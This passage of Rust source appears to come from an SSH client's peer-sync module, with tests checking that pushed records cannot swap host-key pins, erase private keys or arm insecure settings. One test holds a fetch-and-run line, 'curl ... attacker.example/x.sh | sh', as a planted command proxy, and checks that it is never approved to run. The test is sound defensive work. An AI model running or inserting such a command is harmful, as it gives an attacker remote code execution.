/// exactly what a compromised peer would rewrite, and because a route
/// silently changing under a host that has worked for a year is
/// indistinguishable from nothing having happened.
///
/// So the vault's own event log gets a line. It is deliberately not a
/// toast (a round can carry many, and the user is rarely watching when
/// one lands) and deliberately not a diff (the old value is gone by the
/// time this runs, and a second read per record to reconstruct it would
/// cost every round for a line nobody reads on most of them). What it
/// answers is "a peer wrote this, here is what it says now", which is
/// the question the counters cannot.
///
/// Never carries a secret: a proxy is logged by KIND, never by its
/// command line or credentials.
fn log_route_overwrite(v: &VaultStore, label: &str, hostname: &str, message: String) {
    use oryxis_core::models::log_entry::{LogEntry, LogEvent};
    if let Err(e) = v.add_log(&LogEntry::new(
        label,
        hostname,
        LogEvent::SyncApplied,
        &message,
    )) {
        tracing::warn!("sync: could not log an applied route change: {e}");
    }
}

/// How a proxy is described in the audit line: its kind and endpoint,
/// never the command line (user-authored, can embed credentials) and
/// never a password.
fn proxy_summary(proxy: &oryxis_core::models::connection::ProxyConfig) -> String {
    use oryxis_core::models::connection::ProxyType;
    match &proxy.proxy_type {
        ProxyType::Command(_) => "command proxy".to_string(),
        ProxyType::Socks5 => format!("SOCKS5 {}:{}", proxy.host, proxy.port),
        ProxyType::Socks4 => format!("SOCKS4 {}:{}", proxy.host, proxy.port),
        ProxyType::Http => format!("HTTP {}:{}", proxy.host, proxy.port),
    }
}

#[cfg(test)]
mod lww_tests {
    use super::*;
    use std::sync::Mutex;

    use chrono::{Duration, Utc};
    use oryxis_core::models::connection::Connection;
    use tempfile::NamedTempFile;

    const SECRET: [u8; 32] = [7u8; 32];

    fn vault() -> Arc<Mutex<VaultStore>> {
        let tmp = NamedTempFile::new().unwrap();
        let path = tmp.path().to_path_buf();
        std::mem::forget(tmp);
        let mut v = VaultStore::open(&path).unwrap();
        v.set_master_password("test").unwrap();
        Arc::new(Mutex::new(v))
    }

    fn seed_conn(vault: &Arc<Mutex<VaultStore>>, id: Uuid, label: &str, ts: chrono::DateTime<Utc>) {
        let mut c = Connection::new(label, "10.0.0.9");
        c.id = id;
        c.updated_at = ts;
        vault.lock().unwrap().save_connection(&c, None).unwrap();
    }

    /// A sealed connection record stamped at `ts`, as a peer would push it.
    fn conn_record(id: Uuid, label: &str, ts: chrono::DateTime<Utc>) -> protocol::SyncRecord {
        conn_record_used(id, label, ts, None)
    }

    /// The same, carrying the peer's own `last_used` stamp.
    fn conn_record_used(
        id: Uuid,
        label: &str,
        ts: chrono::DateTime<Utc>,
        last_used: Option<chrono::DateTime<Utc>>,
    ) -> protocol::SyncRecord {
        let mut c = Connection::new(label, "10.0.0.9");
        c.id = id;
        c.updated_at = ts;
        c.last_used = last_used;
        let wrapper = protocol::SyncConnection {
            connection: c,
            password: None,
            password_cleared: false,
            proxy_password: None,
            proxy_password_cleared: false,
            totp_secret: None,
            totp_secret_cleared: false,
            target_password: None,
            target_password_cleared: false,
        };
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let payload = cipher.encrypt(&serde_json::to_vec(&wrapper).unwrap()).unwrap();
        protocol::SyncRecord {
            entity_type: EntityType::Connection,
            entity_id: id,
            updated_at: ts,
            is_deleted: false,
            payload,
        }
    }

    fn label_of(vault: &Arc<Mutex<VaultStore>>, id: Uuid) -> Option<String> {
        vault
            .lock()
            .unwrap()
            .list_connections()
            .unwrap()
            .into_iter()
            .find(|c| c.id == id)
            .map(|c| c.label)
    }

    /// Recency is per device. A peer's later edit of a host lands with
    /// everything it carries except this machine's own "last used": the
    /// stamp the row had here stays, and a host new to this machine
    /// arrives unused whatever the peer's stamp said.
    #[test]
    fn a_peer_edit_keeps_this_devices_recency() {
        let vault = vault();
        let id = Uuid::new_v4();
        let edited = Utc::now() - Duration::hours(2);
        let used_here = Utc::now() - Duration::hours(1);
        let mut local = Connection::new("box", "10.0.0.9");
        local.id = id;
        local.updated_at = edited;
        local.last_used = Some(used_here);
        vault.lock().unwrap().save_connection(&local, None).unwrap();

        let theirs = Utc::now() - Duration::minutes(30);
        let newcomer = Uuid::new_v4();
        apply_records(
            &vault,
            &[
                conn_record_used(id, "box-renamed", Utc::now(), Some(theirs)),
                conn_record_used(newcomer, "new-box", Utc::now(), Some(theirs)),
            ],
            Some(&SECRET),
        )
        .unwrap();

        let conns = vault.lock().unwrap().list_connections().unwrap();
        let box_ = conns.iter().find(|c| c.id == id).expect("the edit landed");
        assert_eq!(box_.label, "box-renamed", "the peer's edit was not applied");
        assert_eq!(
            box_.last_used.map(|t| t.timestamp()),
            Some(used_here.timestamp()),
            "the peer's recency replaced this device's",
        );
        let new = conns.iter().find(|c| c.id == newcomer).expect("the new host landed");
        assert_eq!(new.last_used, None, "a host never used here arrived with a stamp");
    }

    /// The send side never puts recency on the wire: a peer that
    /// predates the apply-side rule would otherwise write ours over its
    /// own.
    #[test]
    fn collect_leaves_recency_home() {
        let vault = vault();
        let mut c = Connection::new("box", "10.0.0.9");
        c.last_used = Some(Utc::now());
        vault.lock().unwrap().save_connection(&c, None).unwrap();

        let records = collect_records(
            &vault,
            &[protocol::DeltaRef {
                entity_type: EntityType::Connection,
                entity_id: c.id,
            }],
            Some(&SECRET),
        )
        .unwrap();
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let plain = cipher.decrypt(&records[0].payload).unwrap();
        let wire: protocol::SyncConnection = serde_json::from_slice(&plain).unwrap();
        assert_eq!(wire.connection.last_used, None, "recency rode the wire");
    }

    /// The mosh options travel WHOLE, and that is the deliberate half of
    /// the decision the Telnet escape below settles the other way.
    ///
    /// Two of them become words in a command line, so the question of
    /// whether they should be stripped is a fair one. They should not:
    /// what they run runs on the REMOTE host, which is the host the
    /// session is opening anyway, which makes them the same class as
    /// `initial_command`. The gate on `ProxyType::Command` exists
    /// because that one spawns a LOCAL process, on the machine the user
    /// is sitting at, before any handshake. Nothing here does.
    #[test]
    fn collect_keeps_every_mosh_option() {
        let vault = vault();
        let mut c = Connection::new("box", "10.0.0.9");
        c.mosh = Some(oryxis_core::models::mosh::MoshOptions {
            enabled: true,
            server_path: "/opt/mosh/bin/mosh-server".into(),
            port_range: "60000:60010".into(),
            command: "tmux new -A -s main".into(),
        });
        vault.lock().unwrap().save_connection(&c, None).unwrap();

        let records = collect_records(
            &vault,
            &[protocol::DeltaRef {
                entity_type: EntityType::Connection,
                entity_id: c.id,
            }],
            Some(&SECRET),
        )
        .unwrap();
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let plain = cipher.decrypt(&records[0].payload).unwrap();
        let wire: protocol::SyncConnection = serde_json::from_slice(&plain).unwrap();
        let mosh = wire.connection.mosh.expect("the options travel");
        assert!(mosh.enabled);
        assert_eq!(mosh.server_path, "/opt/mosh/bin/mosh-server");
        assert_eq!(mosh.port_range, "60000:60010");
        assert_eq!(mosh.command, "tmux new -A -s main");
    }

    /// The Telnet TLS escape ("accept a certificate the trust store
    /// rejects") is a decision about ONE appliance on ONE machine, so
    /// it must not ride the wire: a peer would otherwise disarm
    /// certificate verification on a computer whose owner never saw
    /// that host. The TLS setting itself DOES travel, because it
    /// describes the endpoint. Same shape as the command-proxy
    /// approval, which is local-only by construction.
    #[test]
    fn collect_strips_the_telnet_certificate_escape() {
        use oryxis_core::models::connection::ConnectionProtocol;
        let vault = vault();
        let mut c = Connection::new("switch", "10.0.0.1");
        c.protocol = ConnectionProtocol::Telnet;
        c.port = 992;
        c.telnet = Some(oryxis_core::models::telnet::TelnetOptions {
            tls: true,
            tls_insecure: true,
        });
        vault.lock().unwrap().save_connection(&c, None).unwrap();

        let records = collect_records(
            &vault,
            &[protocol::DeltaRef {
                entity_type: EntityType::Connection,
                entity_id: c.id,
            }],
            Some(&SECRET),
        )
        .unwrap();
        assert_eq!(records.len(), 1);
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let plain = cipher.decrypt(&records[0].payload).unwrap();
        let wire: protocol::SyncConnection = serde_json::from_slice(&plain).unwrap();
        let opts = wire.connection.telnet.expect("TLS itself travels");
        assert!(opts.tls);
        assert!(
            !opts.tls_insecure,
            "the certificate escape must never reach a peer"
        );
    }

    /// The other half of the same rule: a peer that predates the strip
    /// (or one that lies) cannot arm the escape here either.
    #[test]
    fn apply_strips_the_telnet_certificate_escape() {
        use oryxis_core::models::connection::ConnectionProtocol;
        let vault = vault();
        let mut c = Connection::new("switch", "10.0.0.1");
        c.protocol = ConnectionProtocol::Telnet;
        c.port = 992;
        c.telnet = Some(oryxis_core::models::telnet::TelnetOptions {
            tls: true,
            tls_insecure: true,
        });
        let wrapper = protocol::SyncConnection {
            connection: c.clone(),
            password: None,
            password_cleared: false,
            proxy_password: None,
            proxy_password_cleared: false,
            totp_secret: None,
            totp_secret_cleared: false,
            target_password: None,
            target_password_cleared: false,
        };
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let payload = cipher.encrypt(&serde_json::to_vec(&wrapper).unwrap()).unwrap();

        apply_records(
            &vault,
            &[protocol::SyncRecord {
                entity_type: EntityType::Connection,
                entity_id: c.id,
                updated_at: Utc::now(),
                is_deleted: false,
                payload,
            }],
            Some(&SECRET),
        )
        .unwrap();

        let stored = vault
            .lock()
            .unwrap()
            .list_connections()
            .unwrap()
            .into_iter()
            .find(|x| x.id == c.id)
            .expect("the host arrived");
        let opts = stored.telnet.expect("TLS itself arrived");
        assert!(opts.tls);
        assert!(
            !opts.tls_insecure,
            "an arriving host must verify certificates until its owner says otherwise"
        );
    }

    #[test]
    fn stale_push_is_rejected() {
        let vault = vault();
        let id = Uuid::new_v4();
        let now = Utc::now();
        seed_conn(&vault, id, "local-new", now);
        // Peer pushes an older copy: defensive LWW must keep the local one.
        let rec = conn_record(id, "remote-old", now - Duration::seconds(60));
        apply_records(&vault, &[rec], Some(&SECRET)).unwrap();
        assert_eq!(label_of(&vault, id).as_deref(), Some("local-new"));
    }

    #[test]
    fn cleared_password_propagates_end_to_end() {
        // #19 end-to-end: device A clears a connection's password; device B
        // (older copy that still has one) must reflect the removal after a
        // collect -> apply round-trip. Exercises the *_cleared sentinel and
        // confirms the clear isn't dropped by the defensive LWW guard.
        let id = Uuid::new_v4();
        let now = Utc::now();

        // A: newer connection with NO password, sync_passwords on.
        let a = vault();
        {
            let v = a.lock().unwrap();
            v.set_setting("sync_passwords", "true").unwrap();
            let mut c = Connection::new("h", "10.0.0.9");
            c.id = id;
            c.updated_at = now;
            v.save_connection(&c, None).unwrap();
        }
        let needed = vec![protocol::DeltaRef {
            entity_type: EntityType::Connection,
            entity_id: id,
        }];
        let records = collect_records(&a, &needed, Some(&SECRET)).unwrap();

        // B: older copy that still holds a password.
        let b = vault();
        {
            let v = b.lock().unwrap();
            let mut c = Connection::new("h", "10.0.0.9");
            c.id = id;
            c.updated_at = now - Duration::seconds(60);
            v.save_connection(&c, Some("old-secret")).unwrap();
            assert_eq!(
                v.get_connection_password(&id).unwrap().as_deref(),
                Some("old-secret")
            );
        }
        apply_records(&b, &records, Some(&SECRET)).unwrap();
        assert_eq!(b.lock().unwrap().get_connection_password(&id).unwrap(), None);
    }

    #[test]
    fn newer_push_is_applied() {
        let vault = vault();
        let id = Uuid::new_v4();
        let now = Utc::now();
        seed_conn(&vault, id, "local-old", now - Duration::seconds(60));
        let rec = conn_record(id, "remote-new", now);
        apply_records(&vault, &[rec], Some(&SECRET)).unwrap();
        assert_eq!(label_of(&vault, id).as_deref(), Some("remote-new"));
    }

    /// End-to-end: an SSH key with a private PEM on device A must arrive
    /// on device B with the private material intact, so it can actually
    /// authenticate. Regression for the sync path shipping key rows with
    /// a NULL private column.
    #[test]
    fn ssh_key_private_material_survives_collect_apply() {
        use oryxis_core::models::{KeyAlgorithm, SshKey};
        let id = Uuid::new_v4();
        let pem = "-----BEGIN OPENSSH PRIVATE KEY-----\nfake-bytes\n-----END OPENSSH PRIVATE KEY-----\n";

        // A: holds the key with its private PEM, sync_passwords on.
        let a = vault();
        {
            let v = a.lock().unwrap();
            v.set_setting("sync_passwords", "true").unwrap();
            let mut k = SshKey::new("laptop", KeyAlgorithm::Ed25519);
            k.id = id;
            v.save_key(&k, Some(pem)).unwrap();
        }
        let needed = vec![protocol::DeltaRef {
            entity_type: EntityType::SshKey,
            entity_id: id,
        }];
        let records = collect_records(&a, &needed, Some(&SECRET)).unwrap();
        assert_eq!(records.len(), 1);

        // B: never saw the key. After apply it has the private PEM.
        let b = vault();
        apply_records(&b, &records, Some(&SECRET)).unwrap();
        let got = b.lock().unwrap().get_key_private(&id).unwrap();
        assert_eq!(got.as_deref(), Some(pem), "private key must survive sync");
    }

    /// A peer holding the key row WITHOUT private material must never
    /// erase the copy on the machine that has it. That state is the
    /// ordinary one, not the exotic one: every key synced by a build
    /// predating the private-key payload landed on its peers exactly
    /// like this, and the manifest is `(id, updated_at)`, so nothing
    /// re-sends it until someone edits the row. Editing it THERE (a
    /// rename, the expose-via-agent toggle, removing a certificate) is
    /// what makes that device win LWW, and an authoritative "cleared"
    /// would take the only copy of the key with it.
    #[test]
    fn ssh_key_without_private_material_never_erases_the_peer_copy() {
        use oryxis_core::models::{KeyAlgorithm, SshKey};
        let id = Uuid::new_v4();

        // A: has the row, no private material, and the newer stamp.
        let a = vault();
        {
            let v = a.lock().unwrap();
            v.set_setting("sync_passwords", "true").unwrap();
            let mut k = SshKey::new("laptop", KeyAlgorithm::Ed25519);
            k.id = id;
            v.save_key(&k, None).unwrap();
        }
        let needed = vec![protocol::DeltaRef {
            entity_type: EntityType::SshKey,
            entity_id: id,
        }];
        let records = collect_records(&a, &needed, Some(&SECRET)).unwrap();

        // B: the machine the key was generated on.
        let b = vault();
        {
            let v = b.lock().unwrap();
            let mut k = SshKey::new("laptop", KeyAlgorithm::Ed25519);
            k.id = id;
            k.updated_at = Utc::now() - Duration::seconds(60);
            v.save_key(&k, Some("origin-pem")).unwrap();
        }
        apply_records(&b, &records, Some(&SECRET)).unwrap();
        assert_eq!(
            b.lock().unwrap().get_key_private(&id).unwrap().as_deref(),
            Some("origin-pem"),
            "a peer with no private material must not erase the origin's key"
        );
    }

    /// The wire cannot ask for a clear even by spelling it out: an empty
    /// PEM is `save_key`'s clearing argument, so it is filtered on apply
    /// rather than passed through.
    #[test]
    fn ssh_key_empty_pem_on_the_wire_does_not_clear() {
        use oryxis_core::models::{KeyAlgorithm, SshKey};
        let id = Uuid::new_v4();

        let b = vault();
        {
            let v = b.lock().unwrap();
            let mut k = SshKey::new("laptop", KeyAlgorithm::Ed25519);
            k.id = id;
            k.updated_at = Utc::now() - Duration::seconds(60);
            v.save_key(&k, Some("origin-pem")).unwrap();
        }

        let mut key = SshKey::new("laptop", KeyAlgorithm::Ed25519);
        key.id = id;
        let updated_at = key.updated_at;
        let wrapper = protocol::SyncSshKey {
            key,
            private_key: Some(String::new()),
        };
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let records = vec![protocol::SyncRecord {
            entity_type: EntityType::SshKey,
            entity_id: id,
            updated_at,
            is_deleted: false,
            payload: cipher.encrypt(&serde_json::to_vec(&wrapper).unwrap()).unwrap(),
        }];
        apply_records(&b, &records, Some(&SECRET)).unwrap();
        assert_eq!(
            b.lock().unwrap().get_key_private(&id).unwrap().as_deref(),
            Some("origin-pem"),
            "an empty PEM must not reach save_key's clearing arm"
        );
    }

    /// With `sync_passwords` off, the key row still travels (metadata is
    /// not a secret) but the private PEM does not, and the receiver's
    /// copy is left untouched rather than nulled.
    #[test]
    fn ssh_key_private_material_withheld_when_passwords_off() {
        use oryxis_core::models::{KeyAlgorithm, SshKey};
        let id = Uuid::new_v4();

        let a = vault();
        {
            let v = a.lock().unwrap();
            // sync_passwords left at its default (off).
            let mut k = SshKey::new("laptop", KeyAlgorithm::Ed25519);
            k.id = id;
            v.save_key(&k, Some("-----BEGIN OPENSSH PRIVATE KEY-----\nx\n"))
                .unwrap();
        }
        let needed = vec![protocol::DeltaRef {
            entity_type: EntityType::SshKey,
            entity_id: id,
        }];
        let records = collect_records(&a, &needed, Some(&SECRET)).unwrap();

        let b = vault();
        {
            let v = b.lock().unwrap();
            let mut k = SshKey::new("laptop", KeyAlgorithm::Ed25519);
            k.id = id;
            k.updated_at = Utc::now() - Duration::seconds(60);
            v.save_key(&k, Some("b-local-pem")).unwrap();
        }
        apply_records(&b, &records, Some(&SECRET)).unwrap();
        assert_eq!(
            b.lock().unwrap().get_key_private(&id).unwrap().as_deref(),
            Some("b-local-pem"),
            "an off switch must not wipe the receiver's private key"
        );
    }

    #[test]
    fn equal_timestamp_is_skipped() {
        let vault = vault();
        let id = Uuid::new_v4();
        let ts = Utc::now();
        seed_conn(&vault, id, "local", ts);
        let rec = conn_record(id, "remote-same-ts", ts);
        apply_records(&vault, &[rec], Some(&SECRET)).unwrap();
        assert_eq!(label_of(&vault, id).as_deref(), Some("local"));
    }

    #[test]
    fn new_entity_is_applied() {
        // No local copy: a record with a real timestamp (the normal pull
        // path after #9) always applies. Regression guard for #9.
        let vault = vault();
        let id = Uuid::new_v4();
        let rec = conn_record(id, "fresh", Utc::now());
        apply_records(&vault, &[rec], Some(&SECRET)).unwrap();
        assert_eq!(label_of(&vault, id).as_deref(), Some("fresh"));
    }

    #[test]
    fn missing_secret_is_rejected() {
        // #5: a peer with no shared secret must be refused, not accepted
        // in plaintext.
        let vault = vault();
        let rec = conn_record(Uuid::new_v4(), "x", Utc::now());
        assert!(apply_records(&vault, &[rec], None).is_err());
    }

    #[test]
    fn collect_stamps_real_updated_at() {
        // #9: collect_records carries the entity's real updated_at, not an
        // apply-time clock.
        let vault = vault();
        let id = Uuid::new_v4();
        let ts = Utc::now() - Duration::seconds(3600);
        seed_conn(&vault, id, "src", ts);
        let needed = vec![protocol::DeltaRef {
            entity_type: EntityType::Connection,
            entity_id: id,
        }];
        let records = collect_records(&vault, &needed, Some(&SECRET)).unwrap();
        assert_eq!(records.len(), 1);
        assert_eq!(records[0].updated_at, ts);
    }

    /// A sealed group record, as a peer would push it.
    fn group_record(
        g: &oryxis_core::models::Group,
    ) -> protocol::SyncRecord {
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let payload = cipher.encrypt(&serde_json::to_vec(g).unwrap()).unwrap();
        protocol::SyncRecord {
            entity_type: EntityType::Group,
            entity_id: g.id,
            updated_at: g.updated_at,
            is_deleted: false,
            payload,
        }
    }

    fn groups_of(vault: &Arc<Mutex<VaultStore>>) -> Vec<oryxis_core::models::Group> {
        vault.lock().unwrap().list_groups().unwrap()
    }

    /// A sealed known-host record, as a peer would push it.
    fn known_host_record(
        kh: &oryxis_core::models::KnownHost,
    ) -> protocol::SyncRecord {
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let payload = cipher.encrypt(&serde_json::to_vec(kh).unwrap()).unwrap();
        protocol::SyncRecord {
            entity_type: EntityType::KnownHost,
            entity_id: kh.id,
            updated_at: kh.updated_at,
            is_deleted: false,
            payload,
        }
    }

    /// A pin is a decision a human made at a fingerprint prompt on THIS
    /// device. A peer may not silently swap it: with a fresh entity id
    /// the record reads as brand new to the LWW gate, but
    /// `save_known_host` keeps one row per (hostname, port, key_type)
    /// and deletes the others, so applying it would replace the local
    /// fingerprint and make the next connect trust the peer's key with
    /// no prompt.
    #[test]
    fn a_peer_cannot_swap_a_pin_this_device_accepted() {
        use oryxis_core::models::known_host::KnownHost;

        let vault = vault();
        let mine = KnownHost::new("bastion.corp", 22, "ssh-ed25519", "SHA256:REAL");
        vault.lock().unwrap().save_known_host(&mine).unwrap();

        // Fresh id, future timestamp: passes the LWW gate outright.
        let mut theirs = KnownHost::new("bastion.corp", 22, "ssh-ed25519", "SHA256:ATTACKER");
        theirs.updated_at = Utc::now() + Duration::seconds(3600);
        apply_records(&vault, &[known_host_record(&theirs)], Some(&SECRET)).unwrap();

        let pins = vault.lock().unwrap().list_known_hosts().unwrap();
        assert_eq!(pins.len(), 1, "the peer's row must not land beside the local one");
        assert_eq!(
            pins[0].fingerprint, "SHA256:REAL",
            "a peer must not replace a fingerprint this device accepted"
        );
        assert_eq!(pins[0].id, mine.id, "the local row itself must survive");
    }

    /// The other half: introducing a pin for an endpoint this vault has
    /// never pinned is ordinary replication, and the reason the category
    /// syncs at all. It must still work.
    #[test]
    fn a_peer_can_introduce_a_pin_for_an_unpinned_endpoint() {
        use oryxis_core::models::known_host::KnownHost;

        let vault = vault();
        let theirs = KnownHost::new("fresh.corp", 2222, "ssh-ed25519", "SHA256:FRESH");
        apply_records(&vault, &[known_host_record(&theirs)], Some(&SECRET)).unwrap();

        let pins = vault.lock().unwrap().list_known_hosts().unwrap();
        assert_eq!(pins.len(), 1);
        assert_eq!(pins[0].fingerprint, "SHA256:FRESH");
    }

    /// Re-sending the SAME fingerprint is a no-op refresh, not a swap,
    /// so it must not be refused (that would make every later round warn
    /// about a host nothing changed on).
    #[test]
    fn a_peer_resending_the_same_fingerprint_is_not_refused() {
        use oryxis_core::models::known_host::KnownHost;

        let vault = vault();
        let mine = KnownHost::new("bastion.corp", 22, "ssh-ed25519", "SHA256:REAL");
        vault.lock().unwrap().save_known_host(&mine).unwrap();

        let mut same = mine.clone();
        same.updated_at = Utc::now() + Duration::seconds(3600);
        apply_records(&vault, &[known_host_record(&same)], Some(&SECRET)).unwrap();

        let pins = vault.lock().unwrap().list_known_hosts().unwrap();
        assert_eq!(pins.len(), 1);
        assert_eq!(pins[0].fingerprint, "SHA256:REAL");
    }

    /// Deletions are deliberately NOT gated: removing a pin (or the
    /// "clear all" the UI offers) has to keep propagating, or
    /// known_hosts becomes a set that only ever grows across the fleet.
    #[test]
    fn a_peer_deletion_still_removes_a_pin() {
        use oryxis_core::models::known_host::KnownHost;

        let vault = vault();
        let mine = KnownHost::new("bastion.corp", 22, "ssh-ed25519", "SHA256:REAL");
        vault.lock().unwrap().save_known_host(&mine).unwrap();

        let tombstone = protocol::SyncRecord {
            entity_type: EntityType::KnownHost,
            entity_id: mine.id,
            updated_at: Utc::now() + Duration::seconds(3600),
            is_deleted: true,
            payload: Vec::new(),
        };
        apply_records(&vault, &[tombstone], Some(&SECRET)).unwrap();

        assert!(vault.lock().unwrap().list_known_hosts().unwrap().is_empty());
    }

    /// The exact scenario the repair exists for: two peers concurrently
    /// re-parent each other's folder, and last-writer-wins merges both
    /// edges into a loop. After the batch the STORED tree must be
    /// acyclic, not merely rendered as if it were.
    #[test]
    fn apply_records_breaks_a_parent_cycle_landed_by_lww() {
        let vault = vault();
        let mut a = oryxis_core::models::Group::new("a");
        let mut b = oryxis_core::models::Group::new("b");
        a.updated_at = Utc::now() - Duration::seconds(60);
        b.updated_at = Utc::now();
        a.parent_id = Some(b.id);
        b.parent_id = Some(a.id);

        apply_records(&vault, &[group_record(&a), group_record(&b)], Some(&SECRET))
            .unwrap();

        let stored = groups_of(&vault);
        assert_eq!(stored.len(), 2);
        // The newer edge is the one detached.
        let stored_b = stored.iter().find(|g| g.id == b.id).unwrap();
        assert_eq!(stored_b.parent_id, None, "the newer edge must be detached");
        // And every group can reach a root through real data now.
        for g in &stored {
            assert!(
                g.parent_id.is_none()
                    || oryxis_core::models::Group::is_reachable_from_root(&stored, g.id),
                "{} still cyclic on disk",
                g.label
            );
        }
    }

    /// The repair must not become a sync loop: because it preserves
    /// `updated_at`, the peer's next copy of the cyclic record is no
    /// longer strictly newer, so the defensive LWW skips it and the
    /// cycle stays repaired.
    #[test]
    fn a_repeated_cyclic_push_does_not_resurrect_the_cycle() {
        let vault = vault();
        let mut a = oryxis_core::models::Group::new("a");
        let mut b = oryxis_core::models::Group::new("b");
        a.updated_at = Utc::now() - Duration::seconds(60);
        b.updated_at = Utc::now();
        a.parent_id = Some(b.id);
        b.parent_id = Some(a.id);
        let batch = [group_record(&a), group_record(&b)];

        apply_records(&vault, &batch, Some(&SECRET)).unwrap();
        // The same peer pushes the same (still cyclic) records again.
        apply_records(&vault, &batch, Some(&SECRET)).unwrap();

        let stored = groups_of(&vault);
        let stored_b = stored.iter().find(|g| g.id == b.id).unwrap();
        assert_eq!(
            stored_b.parent_id, None,
            "a re-push must not resurrect the cycle"
        );
    }

    /// A well-nested hierarchy arriving over sync must survive
    /// untouched: the repair only fires on real loops.
    #[test]
    fn apply_records_leaves_a_clean_hierarchy_alone() {
        let vault = vault();
        let root = oryxis_core::models::Group::new("root");
        let mut child = oryxis_core::models::Group::new("child");
        child.parent_id = Some(root.id);
        let mut grandchild = oryxis_core::models::Group::new("grandchild");
        grandchild.parent_id = Some(child.id);

        apply_records(
            &vault,
            &[
                group_record(&root),
                group_record(&child),
                group_record(&grandchild),
            ],
            Some(&SECRET),
        )
        .unwrap();

        let stored = groups_of(&vault);
        assert_eq!(
            stored.iter().find(|g| g.id == child.id).unwrap().parent_id,
            Some(root.id)
        );
        assert_eq!(
            stored.iter().find(|g| g.id == grandchild.id).unwrap().parent_id,
            Some(child.id)
        );
    }

    /// A child whose parent has not arrived yet is a DANGLING parent,
    /// not a cycle. Detaching it would destroy the hierarchy mid
    /// transfer, and the parent's own record repairs it moments later.
    #[test]
    fn apply_records_keeps_a_child_whose_parent_has_not_arrived_yet() {
        let vault = vault();
        let root = oryxis_core::models::Group::new("root");
        let mut child = oryxis_core::models::Group::new("child");
        child.parent_id = Some(root.id);

        // Batch 1: only the child (its parent is still in flight).
        apply_records(&vault, &[group_record(&child)], Some(&SECRET)).unwrap();
        assert_eq!(
            groups_of(&vault)
                .iter()
                .find(|g| g.id == child.id)
                .unwrap()
                .parent_id,
            Some(root.id),
            "a dangling parent must not be detached"
        );

        // Batch 2: the parent lands and the hierarchy is whole.
        apply_records(&vault, &[group_record(&root)], Some(&SECRET)).unwrap();
        let stored = groups_of(&vault);
        assert!(oryxis_core::models::Group::is_reachable_from_root(
            &stored, child.id
        ));
    }

    /// A sealed proxy-identity record, as a peer would push it.
    fn proxy_identity_record(
        pi: &oryxis_core::models::ProxyIdentity,
    ) -> protocol::SyncRecord {
        let wrapper = protocol::SyncProxyIdentity {
            proxy_identity: pi.clone(),
            password: None,
            password_cleared: false,
        };
        let cipher = crypto::PayloadCipher::new(&SECRET).unwrap();
        let payload = cipher
            .encrypt(&serde_json::to_vec(&wrapper).unwrap())
            .unwrap();
        protocol::SyncRecord {
            entity_type: EntityType::ProxyIdentity,
            entity_id: pi.id,
            updated_at: pi.updated_at,
            is_deleted: false,
            payload,
        }
    }

    /// The command-proxy injection this gate exists for, end to end.
    ///
    /// A peer pushes a `ProxyType::Command` proxy identity and points an
    /// EXISTING group's defaults at it, stamped far in the future so both
    /// last-writer-wins layers accept it. Every host in that group with
    /// no proxy of its own then resolves to a local `sh -c` line at its
    /// next dial, before the handshake, with no user interaction.
    ///
    /// Replication is not the bug and this test does not assert against
    /// it: the records land, exactly as a peer's edits should. What must
    /// hold is that the planted line is not APPROVED to run on this
    /// device, because approval is the thing `apply_records` has no way
    /// to grant (`trusted_proxy_commands` is local-only and no wire
    /// record touches it), and `oryxis-ssh` refuses to spawn what nobody
    /// approved.
    #[test]
    fn a_pushed_command_proxy_reaches_the_dial_but_is_never_approved() {
        const PAYLOAD: &str = "curl -s http://attacker.example/x.sh | sh";
        let vault = vault();
        let future = Utc::now() + Duration::days(3650);

        // What the victim already has: a group with a host inside it,
        // and the host names no proxy of its own.
        let mut group = oryxis_core::models::Group::new("prod");
        let mut host = Connection::new("web-01", "10.0.0.9");
        host.group_id = Some(group.id);
        {
            let v = vault.lock().unwrap();
            v.save_group(&group).unwrap();
            v.save_connection(&host, None).unwrap();
        }

        // What the peer pushes.
        let mut planted = oryxis_core::models::ProxyIdentity::new("updates");
        planted.proxy_type =
            oryxis_core::models::connection::ProxyType::Command(PAYLOAD.into());
        planted.updated_at = future;
        group.defaults = Some(oryxis_core::models::GroupDefaults {
            proxy_identity_id: Some(planted.id),
            ..Default::default()
        });
        group.updated_at = future;
        apply_records(
            &vault,
            &[proxy_identity_record(&planted), group_record(&group)],
            Some(&SECRET),
        )
        .unwrap();

        let v = vault.lock().unwrap();
        // The plant did land, and it does reach the dial: this is the
        // reachability half of the report, kept in the test so the day
        // inheritance stops resolving it, the reason is a decision and
        // not an accident.
        let groups = v.list_groups().unwrap();
        let mut dialed = host.clone();
        v.apply_effective(&mut dialed, &groups, &[]);
        let Some(oryxis_core::models::connection::ProxyType::Command(cmd)) =
            dialed.proxy.as_ref().map(|p| &p.proxy_type)
        else {
            panic!("the planted group default should resolve onto the host's dial");
        };
        assert_eq!(cmd, PAYLOAD);

        // And the half that stops it being code execution.
        assert!(
            !v.is_proxy_command_trusted(PAYLOAD),
            "a synced command proxy must never arrive pre-approved"
        );
    }

    /// The audit line exists for the case the counters hide: a host
    /// that already worked, pointed somewhere else by a peer.
    ///
    /// Creation is not that. A first sync is nothing but creations, and
    /// a line per host would bury the one entry that matters.
    #[test]
    fn only_an_overwritten_route_lands_in_the_event_log() {
        let vault = vault();
        let id = Uuid::new_v4();
        let now = Utc::now();

        // The peer's brand-new host: replication doing its job.
        apply_records(&vault, &[conn_record(id, "fresh", now)], Some(&SECRET)).unwrap();
        assert!(
            vault.lock().unwrap().list_logs(50).unwrap().is_empty(),
            "a new host from a peer is not an audit event"
        );

        // The same host, re-pointed by the peer a minute later.
        apply_records(
            &vault,
            &[conn_record(id, "fresh", now + Duration::seconds(60))],
            Some(&SECRET),
        )
        .unwrap();
        let logs = vault.lock().unwrap().list_logs(50).unwrap();
        assert_eq!(logs.len(), 1, "the overwrite must leave a trace");
        assert!(matches!(
            logs[0].event,
            oryxis_core::models::log_entry::LogEvent::SyncApplied
        ));
        assert!(logs[0].message.contains("sync peer"), "{}", logs[0].message);
    }

    /// The audit line describes the route, never the credential: a
    /// command proxy is logged by KIND, because the line itself is
    /// user-authored and can embed secrets (the same reason the connect
    /// progress card only ever names its type).
    #[test]
